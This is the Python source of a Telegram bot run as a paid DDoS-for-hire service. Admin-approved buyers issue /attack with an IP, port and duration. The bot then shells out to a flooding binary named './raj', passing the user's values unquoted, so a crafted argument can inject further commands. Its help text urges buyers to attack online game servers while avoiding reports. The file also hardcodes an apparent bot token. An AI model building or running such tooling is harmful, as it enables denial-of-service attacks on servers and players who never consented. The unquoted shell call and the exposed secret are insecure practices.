import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

TELEGRAM_BOT_TOKEN = '7656897396:AAELxhZuM9_zYvhTMFrLwMjlTZ70T2zmdK0'
ADMIN_USER_ID = 7530806675
USERS_FILE = 'users.txt'
attack_in_progress = False

def load_users():
    try:
        with open(USERS_FILE) as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        f.writelines(f"{user}\n" for user in users)

users = load_users()

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "Welcome to the Paid Service\n"
        "This is a Single Attack. If you already have access, then *Use /attack <ip> <port> <duration>*\n"
        "Or Buy from Owner. Plan purchase available from the one and only @VIPXDDOS_ADMIN"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def manage(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*If you want access, contact your owner and admin.\nDon't overload our servers!*", parse_mode='Markdown')
        return

    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /manage <add|rem> <user_id>*", parse_mode='Markdown')
        return

    command, target_user_id = args
    target_user_id = target_user_id.strip()

    if command == 'add':
        users.add(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} added.*", parse_mode='Markdown')
    elif command == 'rem':
        users.discard(target_user_id)
        save_users(users)
        await context.bot.send_message(chat_id=chat_id, text=f"*✔️ User {target_user_id} removed.*", parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    attack_in_progress = True

    try:
        process = await asyncio.create_subprocess_shell(
            f"./raj {ip} {port} {duration} 10",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        attack_in_progress = False
        await context.bot.send_message(
            chat_id=chat_id, 
            text=(
                "*✅ Attack Completed! ✅*\n"
                "*Thank you for using our service!*\n"
                "*If you don't provide feedback, your service will be disconnected forever.*"
            ), 
            parse_mode='Markdown'
        )

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress

    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if user_id not in users:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need to be approved to use this bot.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Another attack is already in progress. Please wait.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Check your Gamer Servers 677 ms 😂 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔\n"
        "   Rest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫\n"
        "   Stay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮\n"
        "   Avoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫\n"
        "   Using hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝\n"
        "   Keep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️\n"
        "   Message the owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("manage", manage))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("help", help_command))  # Add the help command here
    application.run_polling()